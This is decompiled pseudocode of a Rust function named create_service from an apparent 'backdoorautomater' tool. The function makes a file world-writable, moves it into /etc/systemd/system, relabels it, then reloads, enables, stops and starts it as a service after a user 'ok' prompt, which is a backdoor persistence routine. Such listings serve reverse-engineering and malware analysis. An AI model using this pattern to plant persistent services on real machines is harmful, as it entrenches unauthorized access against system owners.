__int64 __fastcall backdoorautomater::newservice::create_service(__int64 a1, __int64 a2)
{
  __int128 v2; // xmm0
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rsi
  __int64 v6; // rdx
  __int64 v7; // rcx
  __int64 v8; // r8
  __int64 v9; // r9
  __int128 v10; // xmm0
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rsi
  __int64 v14; // rdx
  __int64 v15; // rcx
  __int64 v16; // r8
  __int64 v17; // r9
  __int64 v18; // rax
  __int64 v19; // rax
  __int64 v20; // rsi
  __int64 v21; // rdx
  __int64 v22; // rcx
  __int64 v23; // r8
  __int64 v24; // r9
  __int64 v25; // rax
  __int64 v26; // rax
  __int64 v27; // rsi
  __int64 v28; // rdx
  __int64 v29; // rcx
  __int64 v30; // r8
  __int64 v31; // r9
  __int128 v32; // xmm0
  __int64 v33; // rax
  __int64 v34; // rax
  __int64 v35; // rsi
  __int64 v36; // rdx
  __int64 v37; // rcx
  __int64 v38; // r8
  __int64 v39; // r9
  __int64 v40; // rax
  __int64 v41; // rax
  __int64 v42; // rsi
  __int64 v43; // rdx
  __int64 v44; // rcx
  __int64 v45; // r8
  __int64 v46; // r9
  __int128 v47; // xmm0
  __int64 v48; // rax
  __int64 v49; // rax
  __int64 v50; // rsi
  __int64 v51; // rdx
  __int64 v52; // rcx
  __int64 v53; // r8
  __int64 v54; // r9
  __int128 v55; // xmm0
  __int64 v56; // r14
  __int64 i; // rsi
  __int64 v58; // rax
  __int64 v59; // rdx
  __int64 v60; // rax
  __int64 v61; // rdx
  __int64 v62; // rax
  __int64 v63; // r14
  __int64 v64; // rax
  __int64 v65; // rax
  __int64 v66; // rsi
  __int64 v67; // rdx
  __int64 v68; // rcx
  __int64 v69; // r8
  __int64 v70; // r9
  __int128 v72; // [rsp+0h] [rbp-2E8h] BYREF
  __int128 v73; // [rsp+20h] [rbp-2C8h] BYREF
  __int128 v74; // [rsp+30h] [rbp-2B8h]
  __int128 v75; // [rsp+40h] [rbp-2A8h]
  __int64 v76; // [rsp+50h] [rbp-298h]
  __int128 v77; // [rsp+60h] [rbp-288h] BYREF
  __int128 v78; // [rsp+70h] [rbp-278h]
  __int128 v79; // [rsp+80h] [rbp-268h]
  __int64 v80; // [rsp+90h] [rbp-258h]
  __int128 v81; // [rsp+A0h] [rbp-248h] BYREF
  __int64 v82; // [rsp+B0h] [rbp-238h]
  __int128 v83; // [rsp+E0h] [rbp-208h] BYREF
  __int64 v84; // [rsp+F0h] [rbp-1F8h]
  __int64 v85; // [rsp+F8h] [rbp-1F0h]
  __int128 v86; // [rsp+100h] [rbp-1E8h] BYREF
  _BYTE v87[24]; // [rsp+110h] [rbp-1D8h]
  __int128 v88; // [rsp+1D0h] [rbp-118h] BYREF
  __int64 v89; // [rsp+1E0h] [rbp-108h]
  __int64 v90; // [rsp+1E8h] [rbp-100h]
  const char *v91; // [rsp+1F0h] [rbp-F8h] BYREF
  __int64 v92; // [rsp+1F8h] [rbp-F0h]
  __int128 v93; // [rsp+200h] [rbp-E8h] BYREF
  __int64 v94; // [rsp+210h] [rbp-D8h]
  __int128 v95; // [rsp+220h] [rbp-C8h] BYREF
  __int64 v96; // [rsp+230h] [rbp-B8h]
  __int128 v97; // [rsp+240h] [rbp-A8h] BYREF
  __int64 v98; // [rsp+250h] [rbp-98h]
  __int128 v99; // [rsp+260h] [rbp-88h] BYREF
  __int64 v100; // [rsp+270h] [rbp-78h]
  __int128 v101; // [rsp+280h] [rbp-68h] BYREF
  __int64 v102; // [rsp+290h] [rbp-58h]
  __int128 v103; // [rsp+2A0h] [rbp-48h] BYREF
  __int64 v104; // [rsp+2B0h] [rbp-38h]

  v85 = a2;
  v90 = a1;
  backdoorautomater::sanitizer::sanitize_service_exist(a1);
  v2 = *(_OWORD *)(a1 + 8);
  *(_QWORD *)&v86 = aChmod777_0;
  *((_QWORD *)&v86 + 1) = 10LL;
  *(_OWORD *)v87 = v2;
  alloc::str::join_generic_copy(&v81, &v86, 2LL, 1LL, 0LL);
  v96 = v82;
  v95 = v81;
  std::process::Command::new(&v86, aSh_0, 2LL);
  v3 = std::process::Command::arg(&v86, aC_2, 2LL);
  v4 = std::process::Command::arg(v3, &v95);
  std::process::Command::output(&v81, v4);
  core::result::Result<T,E>::expect(&v77, &v81, &off_22A070);
  core::ptr::drop_in_place<std::process::Command>(&v86);
  alloc::string::String::from_utf8_lossy(&v81, v79, *((_QWORD *)&v79 + 1));
  v5 = <alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v81);
  <T as alloc::slice::hack::ConvertVec>::to_vec(&v86, v5);
  core::ptr::drop_in_place<alloc::borrow::Cow<str>>(
    &v81,
    v5,
    v6,
    v7,
    v8,
    v9,
    v86,
    *((_QWORD *)&v86 + 1),
    *(_QWORD *)v87);
  backdoorautomater::sanitizer::sanitize_system_command((__int64)&v72);
  v10 = *(_OWORD *)(a1 + 8);
  *(_QWORD *)&v86 = aMv;
  *((_QWORD *)&v86 + 1) = 3LL;
  *(_OWORD *)v87 = v10;
  alloc::str::join_generic_copy(&v81, &v86, 2LL, 1LL, 0LL);
  v94 = v82;
  v93 = v81;
  alloc::vec::Vec<T,A>::extend_from_slice(&v93, aEtcSystemdSyst, 21LL);
  alloc::vec::Vec<T,A>::extend_from_slice(&v93, *(_QWORD *)(a1 + 8), *(_QWORD *)(a1 + 16));
  std::process::Command::new(&v86, aSh_0, 2LL);
  v11 = std::process::Command::arg(&v86, aC_2, 2LL);
  v12 = std::process::Command::arg(v11, &v93);
  std::process::Command::output(&v81, v12);
  core::result::Result<T,E>::expect(&v73, &v81, &off_22A088);
  core::ptr::drop_in_place<std::process::Output>(&v77);
  v80 = v76;
  v79 = v75;
  v78 = v74;
  v77 = v73;
  core::ptr::drop_in_place<std::process::Command>(&v86);
  alloc::string::String::from_utf8_lossy(&v81, v79, *((_QWORD *)&v79 + 1));
  v13 = <alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v81);
  <T as alloc::slice::hack::ConvertVec>::to_vec(&v86, v13);
  *(_QWORD *)&v74 = *(_QWORD *)v87;
  v73 = v86;
  core::ptr::drop_in_place<alloc::string::String>(&v72);
  core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v81, v13, v14, v15, v16, v17, v73, *((_QWORD *)&v73 + 1), v74);
  backdoorautomater::sanitizer::sanitize_system_command((__int64)&v72);
  <T as alloc::slice::hack::ConvertVec>::to_vec(&v86, aRestorecon);
  v98 = *(_QWORD *)v87;
  v97 = v86;
  if ( (unsigned __int8)backdoorautomater::sanitizer::sanitize_command_exist((__int64)&v97) )
  {
    alloc::str::join_generic_copy(&v86, &off_22A0A0, 2LL, 1LL, 0LL);
    v84 = *(_QWORD *)v87;
    v83 = v86;
    alloc::vec::Vec<T,A>::extend_from_slice(&v83, *(_QWORD *)(a1 + 8), *(_QWORD *)(a1 + 16));
    std::process::Command::new(&v86, aSh_0, 2LL);
    v18 = std::process::Command::arg(&v86, aC_2, 2LL);
    v19 = std::process::Command::arg(v18, &v83);
    std::process::Command::output(&v81, v19);
    core::result::Result<T,E>::expect(&v73, &v81, &off_22A0C0);
    core::ptr::drop_in_place<std::process::Output>(&v77);
    v80 = v76;
    v79 = v75;
    v78 = v74;
    v77 = v73;
    core::ptr::drop_in_place<std::process::Command>(&v86);
    alloc::string::String::from_utf8_lossy(&v81, v79, *((_QWORD *)&v79 + 1));
    v20 = <alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v81);
    <T as alloc::slice::hack::ConvertVec>::to_vec(&v86, v20);
    *(_QWORD *)&v74 = *(_QWORD *)v87;
    v73 = v86;
    core::ptr::drop_in_place<alloc::string::String>(&v72);
    core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v81, v20, v21, v22, v23, v24, v73, *((_QWORD *)&v73 + 1), v74);
    backdoorautomater::sanitizer::sanitize_system_command((__int64)&v72);
    core::ptr::drop_in_place<alloc::string::String>(&v83);
  }
  v91 = aSystemctlDaemo_0;
  v92 = 23LL;
  std::process::Command::new(&v86, aSh_0, 2LL);
  v25 = std::process::Command::arg(&v86, aC_2, 2LL);
  v26 = std::process::Command::arg(v25, &v91);
  std::process::Command::output(&v81, v26);
  core::result::Result<T,E>::expect(&v73, &v81, &off_22A0D8);
  core::ptr::drop_in_place<std::process::Output>(&v77);
  v80 = v76;
  v79 = v75;
  v78 = v74;
  v77 = v73;
  core::ptr::drop_in_place<std::process::Command>(&v86);
  alloc::string::String::from_utf8_lossy(&v81, v79, *((_QWORD *)&v79 + 1));
  v27 = <alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v81);
  <T as alloc::slice::hack::ConvertVec>::to_vec(&v86, v27);
  *(_QWORD *)&v74 = *(_QWORD *)v87;
  v73 = v86;
  core::ptr::drop_in_place<alloc::string::String>(&v72);
  core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v81, v27, v28, v29, v30, v31, v73, *((_QWORD *)&v73 + 1), v74);
  backdoorautomater::sanitizer::sanitize_system_command((__int64)&v72);
  v32 = *(_OWORD *)(a1 + 8);
  *(_QWORD *)&v86 = aSystemctlEnabl;
  *((_QWORD *)&v86 + 1) = 17LL;
  *(_OWORD *)v87 = v32;
  alloc::str::join_generic_copy(&v81, &v86, 2LL, 1LL, 0LL);
  v100 = v82;
  v99 = v81;
  std::process::Command::new(&v86, aSh_0, 2LL);
  v33 = std::process::Command::arg(&v86, aC_2, 2LL);
  v34 = std::process::Command::arg(v33, &v99);
  std::process::Command::output(&v81, v34);
  core::result::Result<T,E>::expect(&v73, &v81, &off_22A0F0);
  core::ptr::drop_in_place<std::process::Output>(&v77);
  v80 = v76;
  v79 = v75;
  v78 = v74;
  v77 = v73;
  core::ptr::drop_in_place<std::process::Command>(&v86);
  alloc::string::String::from_utf8_lossy(&v81, v79, *((_QWORD *)&v79 + 1));
  v35 = <alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v81);
  <T as alloc::slice::hack::ConvertVec>::to_vec(&v86, v35);
  *(_QWORD *)&v74 = *(_QWORD *)v87;
  v73 = v86;
  core::ptr::drop_in_place<alloc::string::String>(&v72);
  core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v81, v35, v36, v37, v38, v39, v73, *((_QWORD *)&v73 + 1), v74);
  backdoorautomater::sanitizer::sanitize_ex_stderr((__int64)&v72);
  v91 = aSystemctlDaemo_0;
  v92 = 23LL;
  std::process::Command::new(&v86, aSh_0, 2LL);
  v40 = std::process::Command::arg(&v86, aC_2, 2LL);
  v41 = std::process::Command::arg(v40, &v91);
  std::process::Command::output(&v81, v41);
  core::result::Result<T,E>::expect(&v73, &v81, &off_22A108);
  core::ptr::drop_in_place<std::process::Output>(&v77);
  v80 = v76;
  v79 = v75;
  v78 = v74;
  v77 = v73;
  core::ptr::drop_in_place<std::process::Command>(&v86);
  alloc::string::String::from_utf8_lossy(&v81, v79, *((_QWORD *)&v79 + 1));
  v42 = <alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v81);
  <T as alloc::slice::hack::ConvertVec>::to_vec(&v86, v42);
  *(_QWORD *)&v74 = *(_QWORD *)v87;
  v73 = v86;
  core::ptr::drop_in_place<alloc::string::String>(&v72);
  core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v81, v42, v43, v44, v45, v46, v73, *((_QWORD *)&v73 + 1), v74);
  backdoorautomater::sanitizer::sanitize_system_command((__int64)&v72);
  v47 = *(_OWORD *)(a1 + 8);
  *(_QWORD *)&v86 = aSystemctlStop_0;
  *((_QWORD *)&v86 + 1) = 15LL;
  *(_OWORD *)v87 = v47;
  alloc::str::join_generic_copy(&v81, &v86, 2LL, 1LL, 0LL);
  v102 = v82;
  v101 = v81;
  std::process::Command::new(&v86, aSh_0, 2LL);
  v48 = std::process::Command::arg(&v86, aC_2, 2LL);
  v49 = std::process::Command::arg(v48, &v101);
  std::process::Command::output(&v81, v49);
  core::result::Result<T,E>::expect(&v73, &v81, &off_22A120);
  core::ptr::drop_in_place<std::process::Output>(&v77);
  v80 = v76;
  v79 = v75;
  v78 = v74;
  v77 = v73;
  core::ptr::drop_in_place<std::process::Command>(&v86);
  alloc::string::String::from_utf8_lossy(&v81, v79, *((_QWORD *)&v79 + 1));
  v50 = <alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v81);
  <T as alloc::slice::hack::ConvertVec>::to_vec(&v86, v50);
  *(_QWORD *)&v74 = *(_QWORD *)v87;
  v73 = v86;
  core::ptr::drop_in_place<alloc::string::String>(&v72);
  core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v81, v50, v51, v52, v53, v54, v73, *((_QWORD *)&v73 + 1), v74);
  backdoorautomater::sanitizer::sanitize_system_command((__int64)&v72);
  v55 = *(_OWORD *)(a1 + 8);
  *(_QWORD *)&v86 = aSystemctlStart;
  *((_QWORD *)&v86 + 1) = 16LL;
  *(_OWORD *)v87 = v55;
  v56 = 1LL;
  alloc::str::join_generic_copy(&v81, &v86, 2LL, 1LL, 0LL);
  v104 = v82;
  v103 = v81;
  *(_QWORD *)&v88 = 0LL;
  *((_QWORD *)&v88 + 1) = 1LL;
  v89 = 0LL;
  *(_QWORD *)&v83 = 0LL;
  *((_QWORD *)&v83 + 1) = 1LL;
  v84 = 0LL;
  for ( i = 0LL; ; i = v84 )
  {
    v58 = <alloc::string::String as core::ops::index::Index<I>>::index(v56, i);
    if ( (unsigned __int8)<[A] as core::slice::cmp::SlicePartialEq<B>>::equal(v58, v59, aOk_0, 2LL) )
      break;
    *(_QWORD *)&v86 = &off_22A190;
    *((_QWORD *)&v86 + 1) = 1LL;
    *(_QWORD *)v87 = 8LL;
    *(_OWORD *)&v87[8] = 0LL;
    std::io::stdio::_print(&v86);
    *(_QWORD *)&v81 = v85;
    *((_QWORD *)&v81 + 1) = <alloc::string::String as core::fmt::Display>::fmt;
    *(_QWORD *)&v86 = &off_22A1A0;
    *((_QWORD *)&v86 + 1) = 2LL;
    *(_QWORD *)&v87[16] = 0LL;
    *(_QWORD *)v87 = &v81;
    *(_QWORD *)&v87[8] = 1LL;
    std::io::stdio::_print(&v86);
    *(_QWORD *)&v86 = &off_22A1C0;
    *((_QWORD *)&v86 + 1) = 1LL;
    *(_QWORD *)v87 = 8LL;
    *(_OWORD *)&v87[8] = 0LL;
    std::io::stdio::_print(&v86);
    *(_QWORD *)&v86 = std::io::stdio::stdin(&v86);
    v60 = std::io::stdio::Stdin::read_line(&v86, &v88);
    core::result::Result<T,E>::expect(v60, v61);
    v62 = core::str::<impl str>::trim_end_matches(*((_QWORD *)&v88 + 1), v89, 10LL);
    <T as alloc::slice::hack::ConvertVec>::to_vec(&v86, v62);
    v82 = *(_QWORD *)v87;
    v81 = v86;
    core::ptr::drop_in_place<alloc::string::String>(&v88);
    v89 = v82;
    v88 = v81;
    <alloc::string::String as core::clone::Clone>::clone(&v86, &v88);
    core::ptr::drop_in_place<alloc::string::String>(&v83);
    v84 = *(_QWORD *)v87;
    v83 = v86;
    alloc::vec::Vec<T,A>::clear(&v88);
    v56 = *((_QWORD *)&v83 + 1);
  }
  *(_QWORD *)&v86 = &off_22A138;
  *((_QWORD *)&v86 + 1) = 1LL;
  *(_QWORD *)v87 = 8LL;
  *(_OWORD *)&v87[8] = 0LL;
  v63 = v90;
  std::io::stdio::_print(&v86);
  std::process::Command::new(&v86, aSh_0, 2LL);
  v64 = std::process::Command::arg(&v86, aC_2, 2LL);
  v65 = std::process::Command::arg(v64, &v103);
  std::process::Command::output(&v81, v65);
  core::result::Result<T,E>::expect(&v73, &v81, &off_22A148);
  core::ptr::drop_in_place<std::process::Output>(&v77);
  v80 = v76;
  v79 = v75;
  v78 = v74;
  v77 = v73;
  core::ptr::drop_in_place<std::process::Command>(&v86);
  alloc::string::String::from_utf8_lossy(&v81, v79, *((_QWORD *)&v79 + 1));
  v66 = <alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v81);
  <T as alloc::slice::hack::ConvertVec>::to_vec(&v86, v66);
  *(_QWORD *)&v74 = *(_QWORD *)v87;
  v73 = v86;
  core::ptr::drop_in_place<alloc::string::String>(&v72);
  core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v81, v66, v67, v68, v69, v70, v73, *((_QWORD *)&v73 + 1), v74);
  backdoorautomater::sanitizer::sanitize_system_command((__int64)&v72);
  *(_QWORD *)&v86 = &off_22A160;
  *((_QWORD *)&v86 + 1) = 1LL;
  *(_QWORD *)v87 = 8LL;
  *(_OWORD *)&v87[8] = 0LL;
  std::io::stdio::_print(&v86);
  *(_QWORD *)&v81 = v85;
  *((_QWORD *)&v81 + 1) = <alloc::string::String as core::fmt::Display>::fmt;
  *(_QWORD *)&v86 = &off_22A170;
  *((_QWORD *)&v86 + 1) = 2LL;
  *(_QWORD *)&v87[16] = 0LL;
  *(_QWORD *)v87 = &v81;
  *(_QWORD *)&v87[8] = 1LL;
  std::io::stdio::_print(&v86);
  core::ptr::drop_in_place<alloc::string::String>(&v83);
  core::ptr::drop_in_place<alloc::string::String>(&v88);
  core::ptr::drop_in_place<alloc::string::String>(&v103);
  core::ptr::drop_in_place<alloc::string::String>(&v101);
  core::ptr::drop_in_place<alloc::string::String>(&v99);
  core::ptr::drop_in_place<alloc::string::String>(&v97);
  core::ptr::drop_in_place<alloc::string::String>(&v93);
  core::ptr::drop_in_place<alloc::string::String>(&v72);
  core::ptr::drop_in_place<std::process::Output>(&v77);
  core::ptr::drop_in_place<alloc::string::String>(&v95);
  core::ptr::drop_in_place<alloc::string::String>(v85);
  return core::ptr::drop_in_place<alloc::string::String>(v63);
}